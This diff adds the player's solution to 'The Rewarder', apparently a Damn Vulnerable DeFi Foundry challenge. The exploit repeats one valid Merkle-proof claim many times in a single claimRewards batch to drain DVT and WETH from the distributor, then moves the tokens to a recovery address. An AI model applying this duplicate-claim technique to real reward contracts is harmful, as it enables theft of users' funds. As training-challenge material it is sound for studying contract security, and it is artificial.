@@ -148,7 +148,54 @@ contract TheRewarderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_theRewarder() public checkSolvedByPlayer {
-        
+      console.log("distributor dvt balance: ", dvt.balanceOf(address(distributor)));
+      console.log("distributor weth balance: ", weth.balanceOf(address(distributor)));
+      console.log("recovery dvt balance: ", dvt.balanceOf(recovery));
+      console.log("recovery weth balance: ", weth.balanceOf(recovery));
+
+      uint256 PLAYER_DVT_AMOUNT = 11524763827831882;
+      uint256 PLAYER_WETH_AMOUNT = 1171088749244340;
+
+      bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+      bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
+
+      uint256 dvtTxCount = TOTAL_DVT_DISTRIBUTION_AMOUNT / PLAYER_DVT_AMOUNT;
+      uint256 wethTxCount = TOTAL_WETH_DISTRIBUTION_AMOUNT / PLAYER_WETH_AMOUNT;
+      uint256 totalTxCount = dvtTxCount + wethTxCount;
+
+      IERC20[] memory inputTokens = new IERC20[](2);
+      inputTokens[0] = IERC20(address(dvt));
+      inputTokens[1] = IERC20(address(weth));
+
+      Claim[] memory claims = new Claim[](totalTxCount);
+
+      for (uint i = 0; i < totalTxCount; i++) {
+        if (i < dvtTxCount) {
+          claims[i] = Claim({
+            batchNumber: 0,
+            amount: PLAYER_DVT_AMOUNT,
+            tokenIndex: 0,
+            proof: merkle.getProof(dvtLeaves, 188)
+          });
+        } else {
+          claims[i] = Claim({
+            batchNumber: 0,
+            amount: PLAYER_WETH_AMOUNT,
+            tokenIndex: 1,
+            proof: merkle.getProof(wethLeaves, 188)
+          });
+        }
+      }
+
+      distributor.claimRewards(claims, inputTokens);
+
+      dvt.transfer(recovery, dvt.balanceOf(player));
+      weth.transfer(recovery, weth.balanceOf(player));
+
+      console.log("distributor dvt balance: ", dvt.balanceOf(address(distributor)));
+      console.log("distributor weth balance: ", weth.balanceOf(address(distributor)));
+      console.log("recovery dvt balance: ", dvt.balanceOf(recovery));
+      console.log("recovery weth balance: ", weth.balanceOf(recovery));
     }
 
     /**
